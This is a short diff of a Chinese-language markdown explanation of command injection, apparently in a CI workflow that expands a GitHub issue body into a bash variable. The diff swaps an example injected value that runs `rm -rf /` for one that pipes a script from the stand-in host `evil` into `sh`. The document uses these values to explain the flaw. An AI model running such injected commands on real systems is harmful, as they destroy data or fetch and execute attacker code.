@@ -13,9 +13,9 @@
     echo "$BODY" | grep "keyword"
 ```
 
-如果 issue body 是 `"; rm -rf /; "`，展开后变成：
+如果 issue body 是 `"$(curl http://evil/payload.sh | sh)"`，展开后变成：
 ```bash
-BODY=""; rm -rf /; ""
+BODY="$(curl http://evil/payload.sh | sh)"
 ```
 
 ## Solution
